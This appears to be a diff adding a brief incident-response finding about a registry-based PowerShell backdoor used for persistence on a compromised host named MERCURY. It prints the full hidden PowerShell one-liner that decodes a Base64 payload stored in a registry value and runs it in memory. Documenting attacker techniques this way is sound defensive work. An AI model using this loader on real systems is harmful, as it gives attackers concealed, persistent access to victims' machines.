@@ -1,0 +1,14 @@
+Persistence was established on the compromised host MERCURY through a registry-based PowerShell backdoor.
+
+A hidden PowerShell command was executed that retrieved and decoded a Base64-encoded payload stored in the registry key:
+
+HKLM\Software\Microsoft\Network\debug
+
+The command executed was:
+
+powershell.exe -NoN -W hidden -c IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKLM:\Software\Microsoft\Network debug).debug)))
+
+This technique allowed the attacker to maintain persistent access by storing the malicious script in the Windows registry and executing it in memory.
+
+Affected host: MERCURY  
+Persistence type: Registry-based PowerShell backdoor
